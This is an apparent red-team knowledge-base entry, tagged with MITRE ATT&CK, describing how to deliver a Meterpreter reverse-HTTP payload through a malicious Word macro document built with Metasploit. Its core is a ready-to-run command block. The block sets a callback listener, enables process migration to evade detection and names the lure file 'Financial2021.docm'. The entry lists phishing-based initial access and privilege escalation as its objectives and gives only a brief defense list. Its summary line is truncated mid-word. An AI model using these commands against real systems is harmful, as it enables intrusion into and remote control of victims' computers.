---
id: 28e68a38-9bc7-4f0d-9cb3-b85ef943f724
name: Office Word Macro Payload Delivery with Metasploit
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.372224+00:00'
updated_at: '2023-04-10T20:36:54.106967+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Scripting|T1064 - Scripting]]'
sub_techniques:
- '[[Visual Basic|T1059.005 - Visual Basic]]'
tags:
- '[[DOCM - Metasploit]]'
- '[[Office - Attacks]]'
commands:
- '[[Exploit Office Word Macro]]'
---

# Office Word Macro Payload Delivery with Metasploit

## Summary

Office Word Macro Payload Delivery with Metasploit is a technique used by attackers to deliver a payload to a target system. This technique involves creating a malicious macro within a Word document and then convincing the target to execute the macro. The macro will then download and execute the pa

## Description

# Description

Office Word Macro Payload Delivery with Metasploit is a technique used by attackers to deliver a payload to a target system. This technique involves creating a malicious macro within a Word document and then convincing the target to execute the macro. The macro will then download and execute the payload, giving the attacker access to the target system. This technique can be used to gain an initial foothold on a target network or to escalate privileges once access has been gained.

From a technical perspective, this technique involves the creation of a malicious macro using the Microsoft Visual Basic for Applications (VBA) programming language. The macro is then embedded within a Word document and saved as a .docm file. The attacker then sends the document to the target and convinces them to open it. Once the macro is executed, it will download and execute the payload from a remote server.

From a business perspective, this technique can be used by attackers to steal sensitive information, install additional malware, or gain access to critical systems. It is important for organizations to be aware of this technique and take steps to protect against it.

## Requirements

1. Access to a system with Microsoft Word installed

1. Metasploit framework

## Defense

1. Educate employees on the dangers of opening unsolicited Word documents

1. Use anti-malware software to detect and prevent the execution of malicious macros

1. Disable macros in Microsoft Word unless they are specifically required for business purposes

## Objectives

1. Deliver a payload to a target system

1. Gain initial access to a target network

1. Escalate privileges once access has been gained

# Instructions

1. This command is used to deliver a payload to a target system using a malicious Office Word Macro. The command sets the payload to be delivered, the IP address and port of the listener, and the name of the malicious document. The DisablePayloadHandler option disables the creation of a payload handler, which is useful when using an external payload handler. The PrependMigrate option causes the payload to migrate to a new process before executing, which can help avoid detection. The exploit command executes the attack and the -j option runs the exploit in the background.

**Code**: [[use exploit/multi/fileformat/office_word_macro
set]]

> The 'use' command specifies the exploit module to use. The 'set payload' command sets the payload to be delivered. The 'set LHOST' command sets the IP address of the listener. The 'set LPORT' command sets the port of the listener. The 'set DisablePayloadHandler' command disables the creation of a payload handler. The 'set PrependMigrate' command causes the payload to migrate to a new process before executing. The 'set FILENAME' command sets the name of the malicious document. The 'exploit' command executes the attack. The '-j' option runs the exploit in the background.

**Command** ([[Exploit Office Word Macro]]):

```bash
use exploit/multi/fileformat/office_word_macro
set payload windows/meterpreter/reverse_http
set LHOST 10.10.10.10
set LPORT 80
set DisablePayloadHandler True
set PrependMigrate True
set FILENAME Financial2021.docm
exploit -j
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Scripting|T1064 - Scripting]]

### Sub-Techniques

- [[Visual Basic|T1059.005 - Visual Basic]]

## Commands Used

- [[Exploit Office Word Macro]]

## Tags

- [[DOCM - Metasploit]]
- [[Office - Attacks]]
